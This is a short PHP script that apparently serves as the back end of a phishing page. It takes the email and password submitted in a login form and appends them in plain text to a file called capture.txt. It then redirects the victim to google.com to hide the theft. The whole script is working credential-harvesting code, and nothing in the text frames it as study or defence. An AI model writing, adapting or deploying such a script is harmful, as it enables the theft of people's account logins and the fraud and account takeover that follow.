<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];
    $data = "Email: $email | Password: $password\n";
    file_put_contents("capture.txt", $data, FILE_APPEND);
    header("Location: https://www.google.com"); // Redirecting
    exit();
}
?>
